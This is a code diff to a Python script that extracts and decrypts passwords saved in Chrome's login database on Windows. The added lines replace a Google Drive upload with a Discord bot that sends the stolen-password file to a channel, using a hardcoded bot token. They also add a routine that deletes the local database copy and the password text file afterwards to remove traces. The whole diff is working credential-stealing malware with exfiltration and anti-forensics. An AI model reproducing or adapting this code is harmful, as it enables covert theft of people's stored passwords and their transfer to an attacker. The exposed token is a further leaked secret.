@@ -7,7 +7,7 @@ import sqlite3
 import win32crypt
 from Cryptodome.Cipher import AES
 import shutil
-import Google_Drive_API
+import discord
 
 #GLOBAL CONSTANT
 CHROME_PATH_LOCAL_STATE = os.path.normpath(r"%s\AppData\Local\Google\Chrome\User Data\Local State"%(os.environ['USERPROFILE']))
@@ -60,15 +60,34 @@ def get_db_connection(chrome_path_login_db):
         print("[ERR] Chrome database cannot be found")
         return None
     
-def Password_Fetch_API():
-    Google_API_Credentials_Key=r"E:\Codeing\Python Language\Projects\Project_15_Clipboard_Copy\Credentials_Key.json"
-    script_dir = os.path.dirname(os.path.abspath(__file__))
-    credentials_file = 'Credentials_Key.json'
-    Google_API_Credentials_Key = os.path.join(script_dir, credentials_file)
-    Google_Drive_API.Google_Drive_API(File_Path,Google_API_Credentials_Key)
+def Password_Fetch_API(File):
+    TOKEN = 'MTIwNjg4OTgzMTk4OTUxMDIxNQ.GmYgry.fHzlPDU5h3DMpDqfZg8A5p5X3pb6mbugjf00cY'
+    CHANNEL_ID = 1206955833410330635  #
+    intents = discord.Intents.default()
+    intents.messages = True
+    intents.guilds = True
+    
+    client = discord.Client(intents=intents)
+    
+    @client.event
+    async def on_ready():
+        print(f'We have logged in as {client.user}')
+        await Upload(File)
+        await client.close()
+    
+    async def Upload(file_path):
+        channel = client.get_channel(CHANNEL_ID)
+    
+        with open(file_path, 'rb') as f:
+            picture = discord.File(f)
+            await channel.send(file=picture)
+    
+    client.run(TOKEN)
+def Remove_Traces():
+    os.remove(r"E:\Codeing\Python Language\Projects\Project_17\Loginvault.db")
+    os.remove(r"E:\Codeing\Python Language\Projects\Project_17\DCP_PASS.txt")
 
-
-     
+    
 
 try:
     File_Path=r"E:\Codeing\Python Language\Projects\Project_17\DCP_PASS.txt"
@@ -99,10 +118,8 @@ try:
                 # Close database connection
                 cursor.close()
                 conn.close()
-                os.remove(r"E:\Codeing\Python Language\Projects\Project_17\Loginvault.db")
-    Password_Fetch_API()
+    Password_Fetch_API(File_Path)
+    Remove_Traces()
 
 except Exception as e:
-    print("[ERR] %s" % str(e))
-
-
+    print(e)
